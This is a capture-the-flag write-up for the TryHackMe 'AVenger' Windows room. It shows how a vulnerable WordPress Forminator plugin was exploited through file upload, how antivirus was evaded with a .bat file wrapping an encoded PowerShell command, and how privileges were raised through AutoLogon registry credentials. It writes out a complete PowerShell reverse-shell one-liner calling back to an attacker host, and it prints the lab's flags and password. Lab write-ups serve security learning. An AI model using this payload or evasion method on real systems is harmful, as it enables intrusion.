# TryHackMe — AVenger

**Difficulty:** Medium  
**OS:** Windows  
**Platform:** TryHackMe  
**Tags:** AV Bypass, WordPress, CVE-2023-4596, File Upload, UAC Bypass, Privilege Escalation

---

## Summary

A Windows machine running XAMPP/WordPress stack. A vulnerable Forminator plugin (CVE-2023-4596) allows arbitrary file uploads. Windows Defender blocks PHP shells — bypassed using a `.bat` file with PowerShell EncodedCommand. A simulated user on the server automatically executes uploaded attachments. Privilege escalation achieved via AutoLogon credentials stored in the registry.

---

## Recon

### Nmap

```bash
nmap -sC -sV -p- --min-rate 5000 -oN avenger.nmap <IP>
```

**Results:**

| Port | Service | Info |
|------|---------|------|
| 80/443 | HTTP/HTTPS | Apache 2.4.56 XAMPP (WordPress) |
| 135/139/445 | SMB/RPC | Windows RPC, NetBIOS |
| 3306 | MySQL | MariaDB 10.4.28 |
| 3389 | RDP | Windows Server 2019 |
| 5985 | WinRM | Microsoft HTTPAPI 2.0 |

**Add to /etc/hosts:**

```bash
echo "<IP> avenger.tryhackme" | sudo tee -a /etc/hosts
```

---

## Enumeration

### WPScan

```bash
wpscan --url http://avenger.tryhackme/gift/ --enumerate u,p --plugins-detection aggressive
```

**Findings:**
- WordPress 6.2.2 (outdated)
- Plugin **Forminator 1.24.1** — vulnerable to CVE-2023-4596
- Plugin **file-upload-types 1.3.0**
- User: `admin`
- Upload directory listing enabled: `/wp-content/uploads/`
- XML-RPC enabled

### Gobuster

```bash
gobuster dir -u http://avenger.tryhackme/ -w /usr/share/wordlists/dirb/common.txt -t 30 --timeout 30s
```

**Findings:**
- `/gift/` — WordPress site
- `/dashboard/` — XAMPP panel
- `/xampp/` — XAMPP directory
- `/phpmyadmin` — phpMyAdmin (403)

### Burp Suite — Form Analysis

The form on `/gift/` sends a POST request to `admin-ajax.php`:

```
action: forminator_submit_form_custom-forms
form_id: 1176
upload-1: <file>
```

The form accepts file attachments via `upload-1` and `postdata-1-post-image` fields.

---

## Initial Access

### CVE-2023-4596 — Forminator Unauthenticated File Upload

Forminator 1.24.1 is vulnerable to arbitrary file uploads via the `upload_post_image()` function. The file is saved to the server **before** the extension is validated.

**Problem with PHP shells:**

Windows Defender deleted PHP files instantly after upload. Attempted:
- `.php`, `.php5`, `.phtml`, `.phar` — all removed by AV
- Obfuscation via `str_rot13`, string concatenation, base64, hex encoding — also detected
- `.htaccess` + `.png` — file deleted before access

**Solution — `.bat` file:**

The room name **AVenger** = AntiVirus. A simulated user on the server automatically executes all uploaded attachments. `.bat` files are not detected by AV on upload.

**Step 1 — Generate encoded PowerShell payload:**

```bash
echo '$c=New-Object System.Net.Sockets.TCPClient("<LHOST>",4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=([text.encoding]::ASCII).GetBytes($r);$s.Write($rb,0,$rb.Length);$s.Flush()};$c.Close()' | iconv -t UTF-16LE | base64 -w 0
```

**Step 2 — Create `shell.bat`:**

```bat
powershell -EncodedCommand <BASE64_PAYLOAD>
```

**Step 3 — Start listener:**

```bash
nc -nvlp 4444
```

**Step 4 — Upload via the website form and wait.**

The simulated user executes the `.bat` file → PowerShell EncodedCommand bypasses AV signatures → reverse shell received.

```
whoami
gift\hugo
```

### User Flag

```bash
type C:\Users\hugo\Desktop\user.txt
```

```
THM{WITH_GREAT_POWER_COMES_GREAT_RESPONSIBILITY}
```

---

## Privilege Escalation

### Enumeration

```powershell
whoami /all
```

Hugo is a member of `BUILTIN\Administrators` but with **"Group used for deny only"** — UAC blocks elevated privileges. Mandatory Level: Medium.

### AutoLogon Credentials in Registry

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

**Findings:**
```
AutoAdminLogon: 1
DefaultUserName: hugo
DefaultPassword: SurpriseMF123!
```

### WinRM Access

```bash
evil-winrm -i <IP> -u hugo -p 'SurpriseMF123!'
```

### Reading Root Flag via Invoke-Command

Hugo is in the Administrators group but UAC restricts direct access via WinRM. Using `Invoke-Command` with explicit credentials bypasses UAC restrictions:

```powershell
$pass = ConvertTo-SecureString 'SurpriseMF123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('gift\Administrator', $pass)
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { type C:\Users\Administrator\Desktop\root.txt }
```

### Root Flag

```
THM{I_CAN_DO_THIS_ALL_DAY}
```

---

## Attack Chain

```
Nmap → WPScan → Forminator CVE-2023-4596
    → .bat file upload (AV bypass)
        → Simulated user executes .bat
            → PowerShell EncodedCommand reverse shell
                → User flag (hugo)
                    → AutoLogon creds in registry
                        → WinRM (evil-winrm)
                            → Invoke-Command as Administrator
                                → Root flag
```

---

## Lessons Learned

1. **AV Bypass** — PHP shells are detected by Windows Defender. `.bat` + PowerShell `-EncodedCommand` bypasses signature-based detection
2. **Simulated User** — key mechanic of the room. When a file is uploaded via the form, a simulated user automatically executes it (MITRE T1204 — User Execution)
3. **AutoLogon Credentials** — often stored in plaintext in the registry at `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
4. **UAC Bypass via Invoke-Command** — `Invoke-Command` with explicit credentials allows executing commands as Administrator through WinRM without an interactive session

---

## Tools Used

- `nmap`
- `wpscan`
- `gobuster`, `ffuf`
- `Burp Suite`
- `evil-winrm`
- `netcat`
- CVE-2023-4596 PoC (github.com/E1A/CVE-2023-4596)

---

*Writeup by: [your nickname]*  
*Date: March 2026*
